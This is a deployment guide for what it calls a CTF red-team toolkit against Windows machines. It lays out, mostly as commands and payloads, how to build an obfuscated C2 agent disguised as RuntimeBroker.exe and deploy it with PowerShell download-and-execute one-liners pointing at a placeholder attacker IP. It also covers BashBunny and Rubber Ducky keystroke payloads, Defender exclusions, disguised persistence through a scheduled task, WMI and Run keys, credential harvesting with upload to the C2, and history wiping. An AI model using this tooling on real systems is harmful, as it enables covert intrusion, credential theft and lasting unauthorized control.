# Deployment Guide — Full CTF Red Team Toolkit

How to run everything end-to-end against a Windows target.
Covers three access scenarios: admin via SSH, non-admin via SSH, and physical access (BashBunny).

---

## Table of Contents

- [Prerequisites — Your Attack Machine](#prerequisites--your-attack-machine)
- [File Layout on Your C2 Server](#file-layout-on-your-c2-server)
- [Quick Reference — One-Liners](#quick-reference--one-liners)
- [Scenario 1 — Admin Access via SSH](#scenario-1--admin-access-via-ssh)
- [Scenario 2 — Non-Admin Access via SSH](#scenario-2--non-admin-access-via-ssh)
- [Scenario 3 — Physical Access / BashBunny](#scenario-3--physical-access--bashbunny)
- [Verifying C2 is Working](#verifying-c2-is-working)
- [Persistence — What Gets Installed](#persistence--what-gets-installed)
- [Cleanup](#cleanup)
- [Troubleshooting](#troubleshooting)

---

## Prerequisites — Your Attack Machine

### 1. Start the C2 server

```bash
# From wherever you cloned ctf-hunter
cd ~/Desktop/ctf
python3 c2_server.py --port 8080 --token YOUR_TOKEN
```

Leave this running. It serves everything: the C2 beacon endpoint AND the file download endpoint.

### 2. Build the Go agent for Windows

```bash
cd ~/Desktop/ctf-toolkit/go/agent

# Edit main.go first — bake in your C2 address and token
nano main.go
# Change: defaultServer = "http://YOUR_IP:8080"
#         defaultToken   = "YOUR_TOKEN"

# Build
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w -H windowsgui" -trimpath -o RuntimeBroker.exe .

# Optionally obfuscate (harder for AV)
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble -tiny build -ldflags "-H windowsgui" -o RuntimeBroker.exe .
```

### 3. Build Hunter.dll (credential extractor)

On Windows or via WSL with .NET SDK:

```bash
# On Windows — .NET's own compiler, no install needed
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:Hunter.dll csharp\Hunter.cs
```

### 4. Place files in the C2 server's file-serve directory

The C2 server at `c2_server.py` serves files from a `c2_files/` directory.
Create it and put everything there:

```
c2_files/
├── RuntimeBroker.exe        ← Go agent (Windows, compiled above)
├── Hunter.dll               ← C# credential extractor (compiled above)
├── WinCheck.ps1             ← copy from powershell/WinCheck.ps1
└── Deploy-CTF.ps1           ← copy from Deploy-CTF.ps1
```

```bash
mkdir -p ~/Desktop/ctf/c2_files
cp ~/Desktop/ctf-toolkit/powershell/WinCheck.ps1  ~/Desktop/ctf/c2_files/
cp ~/Desktop/ctf-toolkit/Deploy-CTF.ps1           ~/Desktop/ctf/c2_files/
# Copy RuntimeBroker.exe and Hunter.dll after building them
```

### 5. Start the DNS exfil receiver (optional — for DNS exfil)

```bash
python3 ~/Desktop/ctf/python/dnsout.py recv --port 5353
```

---

## File Layout on Your C2 Server

```
~/Desktop/ctf/
├── c2_server.py             ← C2 server (start this first)
├── c2_files/
│   ├── Deploy-CTF.ps1       ← master deployment script
│   ├── RuntimeBroker.exe    ← Go C2 agent (Windows binary)
│   ├── Hunter.dll           ← C# credential extractor
│   └── WinCheck.ps1         ← Windows privesc checker
└── python/
    └── dnsout.py            ← DNS exfil receiver
```

### File paths on the TARGET (set automatically by Deploy-CTF.ps1)

| Condition | Drop path on target |
|-----------|-------------------|
| Admin | `C:\ProgramData\Microsoft\DevDiv\` |
| Non-admin | `%APPDATA%\Microsoft\Telemetry\` |

The agent is always named `RuntimeBroker.exe` inside the drop path.

---

## Quick Reference — One-Liners

Replace `YOURIP` with your attack machine's IP and `YOURTOKEN` with your C2 token.

### Admin (full deployment)

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1')" -C2 http://YOURIP:8080 -Token YOURTOKEN
```

Or if you can't use `-ep bypass` inline:

```powershell
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
```

Then call it with parameters once loaded:

```powershell
Deploy -C2 http://YOURIP:8080 -Token YOURTOKEN
```

### Non-admin (same script, auto-detects)

Same one-liner. The script detects you're not admin and uses user-writable paths + user-level persistence.

### BashBunny / physical (see Scenario 3 below)

```powershell
# On a payload that runs in ATTACKMODE HID — types this keystroke sequence:
powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
```

---

## Scenario 1 — Admin Access via SSH

**What you have:** SSH session to the Windows target with admin/Administrator account.

### Step 1 — Confirm you're admin

```powershell
whoami /groups | Select-String "S-1-5-32-544"
# OR
[Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
```

### Step 2 — Run Deploy-CTF.ps1

From your SSH session:

```powershell
powershell -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
```

If the target has outbound HTTP blocked, serve the file via DNS:

```powershell
# Alternative: copy via SSH then run locally
# On your machine:
scp ~/Desktop/ctf/c2_files/Deploy-CTF.ps1  Administrator@TARGET_IP:C:\Temp\d.ps1

# On target (SSH):
powershell -ep bypass -f C:\Temp\d.ps1 -C2 http://YOURIP:8080 -Token YOURTOKEN
```

### Step 3 — What happens automatically

1. **Agent downloaded**: `RuntimeBroker.exe` → `C:\ProgramData\Microsoft\DevDiv\`
2. **Defender exclusion added**: Excludes the drop path from scanning
3. **Persistence x3 installed**:
   - Scheduled Task: runs every 4 hours as SYSTEM, disguised as `MicrosoftEdgeUpdateTaskMachineCore`
   - WMI event subscription: triggers every 60 min as SYSTEM
   - Registry: `HKLM\...\Run` → `SecurityHealthSystray`
4. **WinCheck.ps1** runs in memory → output uploaded to C2
5. **Hunter.dll** loaded reflectively → credentials harvested → uploaded to C2
6. **PowerShell history wiped**

### Step 4 — Check results in C2 console

```bash
# On your machine — C2 interactive console
python3 c2_server.py   # shows beacon check-ins

# List uploaded files
ls -la ~/Desktop/ctf/uploads/

# Watch in real time
tail -f ~/Desktop/ctf/uploads/*.txt
```

### Step 5 — Issue commands via C2

In the C2 console:

```
> whoami
> ipconfig /all
> net user
> #get C:\Users\Administrator\Desktop\flag.txt
```

---

## Scenario 2 — Non-Admin Access via SSH

**What you have:** SSH session as a standard user (no admin, no UAC elevation).

### Step 1 — Run Deploy-CTF.ps1 (same one-liner)

```powershell
powershell -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
```

The script auto-detects non-admin and adjusts:
- Drop path: `%APPDATA%\Microsoft\Telemetry\RuntimeBroker.exe`
- Skips Defender modification (needs admin)
- Skips WMI subscription (needs admin)
- Uses user-level persistence instead

### What gets installed (non-admin)

| Component | Admin | Non-Admin |
|-----------|-------|-----------|
| Drop path | `C:\ProgramData\Microsoft\DevDiv\` | `%APPDATA%\Microsoft\Telemetry\` |
| Scheduled Task | SYSTEM, every 4h | Current user, at logon |
| WMI subscription | Yes (SYSTEM) | No (needs admin) |
| Registry Run | `HKLM\...\Run` | `HKCU\...\Run` |
| Defender exclusion | Yes | No |

### Privilege escalation path

After initial access, WinCheck results are uploaded to C2. Look for:

```powershell
# In the C2 console — read the wincheck output
#get C:\Users\<user>\AppData\Local\Temp\wincheck_out.txt

# Or directly from C2 uploads/
cat ~/Desktop/ctf/uploads/wincheck_*.txt | grep -E "VULNERABLE|EXPLOIT|WRITABLE"
```

Common non-admin → admin escalation paths the script checks:
- Writable service binary paths (binary planting)
- Unquoted service paths
- AlwaysInstallElevated registry keys
- Writable task XML files
- Token impersonation (SeImpersonatePrivilege → PrintSpoofer/JuicyPotato)

---

## Scenario 3 — Physical Access / BashBunny

**What you have:** Physical access to an unlocked or briefly accessible Windows machine.
You are using a USB Rubber Ducky, BashBunny, or similar HID injector.

### BashBunny payload

Create `payloads/switch1/payload.txt`:

```bash
#!/bin/bash
# BashBunny payload — CTF full deploy
# Switch position 1 = admin target

ATTACKMODE HID STORAGE
LED ATTACK

# Wait for Windows to recognize the device
sleep 3

# Open Run dialog
QUACK GUI r
sleep 1

# Type PowerShell command
QUACK STRING powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
QUACK ENTER

sleep 30
LED FINISH
```

### Alternative — serve the file from BashBunny storage

If the target has no outbound internet, serve Deploy-CTF.ps1 from the BashBunny's storage drive:

```bash
# payload.txt
ATTACKMODE HID STORAGE
LED ATTACK
sleep 3

# BashBunny appears as drive letter — usually E: or F:
QUACK GUI r
sleep 1
QUACK STRING powershell -w hidden -ep bypass -f E:\Deploy-CTF.ps1 -C2 http://YOURIP:8080 -Token YOURTOKEN
QUACK ENTER

sleep 45
LED FINISH
```

Put `Deploy-CTF.ps1` in the root of the BashBunny's storage partition.

### Rubber Ducky payload

```ducky
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
ENTER
```

### What happens on physical access

1. PowerShell opens hidden — no visible window
2. Script downloads and executes from memory
3. Agent installed + persistence set up
4. Machine now beacons back to your C2 even after you leave

### If the screen is locked

Physical access to a locked screen is out of scope unless you have credentials.
Use a bootable USB (Kali live) for offline attacks:
- Read SAM/SYSTEM hives → crack NTLM hashes offline
- Access the filesystem directly for flags/sensitive files

---

## Verifying C2 is Working

### On your machine

```bash
# Watch for beacons
python3 c2_server.py --port 8080 --token YOURTOKEN
# You should see:
# [BEACON] RuntimeBroker @ 192.168.x.x (Windows 10) — 2024-01-01 12:00:00
```

### From the target (test connectivity)

```powershell
# Quick test — does the target reach your C2?
(New-Object Net.WebClient).DownloadString('http://YOURIP:8080/ping')

# Test file download
(New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1') | Select-String "param"
```

### Check uploaded results

```bash
# All uploads land here
ls -la ~/Desktop/ctf/uploads/

# Credential harvest output
cat ~/Desktop/ctf/uploads/hunter_*.txt

# Privesc report
cat ~/Desktop/ctf/uploads/wincheck_*.txt
```

---

## Persistence — What Gets Installed

All three methods use names that blend in with legitimate Windows components.

### Method 1 — Scheduled Task

| Item | Value |
|------|-------|
| Task name | `MicrosoftEdgeUpdateTaskMachineCore` |
| Trigger | Every 4 hours |
| Action | Run `RuntimeBroker.exe` |
| Run as | SYSTEM (admin) / current user (non-admin) |
| Hidden | Yes (`IsHidden = $true`) |

```powershell
# Verify installation
Get-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineCore"
```

### Method 2 — WMI Event Subscription (admin only)

| Item | Value |
|------|-------|
| Filter name | `CTFMonitor` |
| Timer ID | `CTFTimer` |
| Consumer | `CommandLineEventConsumer` → `RuntimeBroker.exe` |
| Interval | Every 60 minutes |
| Run as | SYSTEM |

```powershell
# Verify
Get-WMIObject -Namespace root\subscription -Class __EventFilter | Where Name -eq 'CTFMonitor'
```

### Method 3 — Registry Run Key

| Item | Value |
|------|-------|
| Key | `HKLM:\...\CurrentVersion\Run` (admin) or `HKCU:\...\Run` (non-admin) |
| Value name | `SecurityHealthSystray` |
| Data | Path to `RuntimeBroker.exe` |

```powershell
# Verify
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthSystray"
# or for non-admin:
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityHealthSystray"
```

---

## Cleanup

To remove all traces from the target, pass `-Cleanup` to the script:

```powershell
# Via C2 console — send cleanup command
> powershell -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1')) ; Deploy-CTF -Cleanup"

# Or if you have SSH:
powershell -ep bypass -c "& { . <script> ; Deploy-CTF -C2 http://YOURIP:8080 -Cleanup }"
```

Cleanup removes:
- The drop directory and all files
- The scheduled task
- The WMI event filter, consumer, and binding
- The registry Run key entry

---

## Troubleshooting

### "Cannot connect to C2 server"

```powershell
# Check from target
Test-NetConnection -ComputerName YOURIP -Port 8080
```

- Make sure `c2_server.py` is running on your machine
- Check your firewall: `sudo ufw allow 8080`
- If on VPN/HTB, use the tun0 interface IP: `ip addr show tun0`

### "Execution policy blocks the script"

```powershell
# Bypass options (try in order)
powershell -ep bypass -c "..."
powershell -ep unrestricted -c "..."

# Or use encoded command
$cmd = "IEX((New-Object Net.WebClient).DownloadString('http://YOURIP:8080/file/Deploy-CTF.ps1'))"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $enc
```

### "Agent download fails"

The script falls back to a pure PowerShell beacon that doesn't require file download.
Check the C2 console — you may see check-ins even if the binary wasn't downloaded.

```bash
# Verify the file is being served
curl http://YOURIP:8080/file/RuntimeBroker.exe -o /dev/null -w "%{http_code}"
# Should return 200
```

### "AV blocked the agent"

Try garble-compiled version:

```bash
cd ~/Desktop/ctf-toolkit/go/agent
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble -tiny build -ldflags "-H windowsgui" -o RuntimeBroker.exe .
```

Then replace the file in `c2_files/` and re-run deployment.

### "Hunter.dll failed to load"

Hunter.dll requires .NET 6+ for AES-GCM. Older targets may not have it.

```powershell
# Check .NET version on target
[Environment]::Version
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -Recurse |
    Get-ItemProperty -Name "Version" -EA 0 | Where PSChildName -eq "Full"
```

If .NET 4.x only, the DPAPI-based credential extraction still works but AES-GCM (Chrome v80+) won't.

---

## Full Attack Workflow Summary

```
1. Start C2:        python3 c2_server.py --port 8080 --token TOKEN
2. Build agent:     garble build → RuntimeBroker.exe
3. Copy files:      to c2_files/
4. Get access:      SSH (scenario 1/2) or BashBunny (scenario 3)
5. Run deploy:      one-liner IEX download
6. Watch C2:        beacons appear within seconds
7. Issue commands:  > whoami, > ipconfig, > #get flag.txt
8. Harvest creds:   cat uploads/hunter_*.txt
9. Read privesc:    cat uploads/wincheck_*.txt → escalate
10. Cleanup:        -Cleanup flag or manual removal
```
